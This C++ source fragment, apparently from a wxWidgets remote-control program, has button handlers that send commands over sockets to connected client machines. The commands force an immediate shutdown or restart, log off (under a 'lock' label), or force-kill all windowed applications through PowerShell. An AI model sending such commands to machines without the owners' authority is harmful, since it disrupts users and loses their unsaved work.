void Window::ButtonClose(wxCommandEvent &event) {
	CloseSocket();
}

void Window::ShutdownButtonCommand(wxCommandEvent &event) {
	std::string cmd = "shutdown /s /t 0";

	try {
		int result = send(clientSocks[selectedClient - 1], cmd.c_str(), cmd.size(), 0);
		if (result >= 0) WarningText("Shutdown signal was sent successfully.");		
	} catch (std::exception &err) {
		std::cout << "[!]Error: " << err.what() << std::endl;		
		WarningText("Failed to send shutdown signal.");
	}
}

void Window::RestartButtonCommand(wxCommandEvent &event) {
	std::string cmd = "shutdown /r /t 0";

	try {
		int result = send(clientSocks[selectedClient - 1], cmd.c_str(), cmd.size(), 0);
		if (result >= 0) WarningText("Restart signal was sent successfully.");		
	} catch (std::exception &err) {
		std::cout << "[!]Error: " << err.what() << std::endl;
		WarningText("Failed to send restart signal.");
	}
}

void Window::LockButtonCommand(wxCommandEvent &event) {
	std::string cmd = "shutdown /l";

	try {
		int result = send(clientSocks[selectedClient - 1], cmd.c_str(), cmd.size(), 0);
		if (result >= 0) WarningText("Lock signal was sent successfully.");		
	} catch (std::exception &err) {
		std::cout << "[!]Error: " << err.what() << std::endl;
		WarningText("Failed to send lock signal.");
	}
}

void Window::CloseAppsButtonCommand(wxCommandEvent &event) {
	std::string cmd = "powershell -Command \"Get-Process | Where-Object { $_.MainWindowTitle -ne '' -and $_.Id -ne $PID -and $_.ProcessName -ne 'explorer' } | Stop-Process -Force\"";

	try {
		int result = send(clientSocks[selectedClient - 1], cmd.c_str(), cmd.size(), 0);
		if (result >= 0) WarningText("Close apps signal was sent successfully.");		
	} catch (std::exception &err) {
		std::cout << "[!]Error: " << err.what() << std::endl;
		WarningText("Failed to send close apps signal.");
	}
}